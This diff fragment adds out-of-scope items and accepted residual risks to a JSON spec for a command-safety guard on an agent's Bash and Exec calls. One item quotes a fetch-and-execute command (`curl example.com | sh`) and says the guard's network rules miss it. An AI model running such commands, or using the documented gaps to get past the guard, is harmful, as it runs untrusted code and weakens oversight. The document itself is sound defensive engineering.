+    "Changing the headless ask resolver or any ask-channel behaviour.",
+    "Guarding `RunCommand` verb calls (D14: they run user-declared commands) or any identity other than `Bash` and `Exec`.",
+    "Turning the guard on by default or adding it to any shipped profile.",
+    "Special handling of turn cancellation while the guard awaits the classifier; the wait is bounded by `commandSafety.shadow.timeoutMs` and the existing post-approval signal check applies.",
+    "Exempting temp-only commands when the sandbox is unavailable or `execution.sandbox.filesystem.allowSharedTmp` is true.",
+    "Telling a branch name that ends in a letter-led extension (`release/v1.x`, `origin/topic.a`) from a path: `git checkout` of such a branch matches the new `discards_work` pattern and asks. This residual is accepted.",
+    "Commands that name no path at all but fetch and run remote code without a URL scheme (`cd /tmp && curl example.com | sh`). If one is temp-only, only the rule families stand between it and a skipped classifier; the `network_send` rules do not match a plain `curl` download. This residual is accepted.",
+    "Guarding a `Bash` call whose `command` is not a string, or an argv call whose `argv` is not a string array; the policy refuses malformed input before the guard is reached."
+  ],
+  "routingProfile": "native"
+}
